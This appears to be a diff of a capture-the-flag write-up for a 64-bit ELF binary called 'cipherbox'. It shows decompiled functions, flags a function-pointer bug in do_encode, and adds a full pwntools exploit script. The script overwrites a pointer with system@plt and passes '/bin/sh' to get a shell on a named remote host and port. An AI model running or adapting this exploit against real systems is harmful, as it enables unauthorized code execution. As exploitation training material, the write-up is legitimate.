@@ -1,5 +1,4 @@
-
-file info:
+### file info:
 ```c
 └─$ file cipherbox           
 cipherbox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=879cab16e94bf921b9dba518ae0ad6fb665b4293, for GNU/Linux 3.2.0, not stripped
@@ -10,11 +9,10 @@ cipherbox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH       Symbols         FORTIFY Fortified       Fortifiable     FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   58 Symbols         No    0               3               cipherbox       
 ```
-code:
+### code:
+`main()`:
 ```c
-
 undefined8 main(void)
-
 {
   undefined4 option;
   undefined1 buffer [32];
@@ -63,9 +61,23 @@ undefined8 main(void)
   } while( true );
 }
 ```
+
+```c
+
+void print_hex(long buf,ulong len)
+
+{
+  ulong i;
+  
+  for (i = 0; i < len; i = i + 1) {
+    printf("%02x ",(ulong)*(byte *)(i + buf));
+  }
+  putchar(10);
+  return;
+}
+```
 ```c
 void do_set(undefined8 buffer)
-
 {
   int val1;
   int val2;
@@ -86,7 +98,6 @@ void do_set(undefined8 buffer)
 ```
 ```c
 void do_get(undefined8 buffer)
-
 {
   byte val1;
   uint val2;
@@ -105,7 +116,6 @@ void do_get(undefined8 buffer)
 ```
 ```c
 void do_encode(long buffer)
-
 {
   undefined1 buf [256];
   byte text [256];
@@ -130,9 +140,12 @@ void do_encode(long buffer)
   return;
 }
 ```
+* bug:
+  ```c
+  (**(code **)(buffer + 0x20))(buf,len);
+  ````
 ```c
 void do_reset(long buffer)
-
 {
   int option;
   uint key;
@@ -167,9 +180,9 @@ void do_reset(long buffer)
   return;
 }
 ```
+* bug
 ```c
 void do_dump(long buffer)
-
 {
   int j;
   int i;
@@ -183,6 +196,72 @@ void do_dump(long buffer)
   }
   return;
 }
+```
 
 
+
+___ 
+Script: `script.py`
+```python
+from pwn import *
+
+context.binary = exe = ELF("./cipherbox", checksec=False)
+# context.log_level = "debug"
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		br *main+100
+		br *main+121
+		br *main+192
+
+		br *do_encode
+		br *do_encode+279
+		''')
+
+def do_set(pos, val):
+	p.sendlineafter(b">> ", b"1")
+	p.sendlineafter(b"(0-255): ", str(pos))
+	p.sendlineafter(b"(0-255): ", str(val))
+
+def do_get(idx):
+	p.sendlineafter(b">> ", b"2")
+	p.sendlineafter(b"(0-255): ", str(idx))
+
+def do_encode(text):
+	p.sendlineafter(b">> ", b"3")
+	p.sendlineafter(b"Text: ", text)
+
+def do_reset():
+	p.sendlineafter(b">> ", b"4")
+	p.sendlineafter(b"Mode: ", b"1")
+
+#nc 67.223.119.69 3647
+p = remote("67.223.119.69", 3647)
+# p = process(exe.path)
+# GDB()
+
+system_plt = p64(0x0000000000401110)
+
+p.sendlineafter(b"Name: ", b"Long")
+
+# overwrite tu 247 - 240
+do_set(247, 0)
+do_set(246, 0)
+do_set(245, 0)
+do_set(244, 0)
+do_set(243, 0)
+do_set(242, 64)
+do_set(241, 17)
+do_set(240, 16)
+
+do_reset()
+
+# hex = {0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68}
+# i = 0x2F
+# print(f"character at {i}: {str(do_get(i))}")
+
+#/bin/sh\00
+do_encode(b"\x2F\x62\x69\x6E\x2F\x73\x68")
+
+p.interactive()
 ```
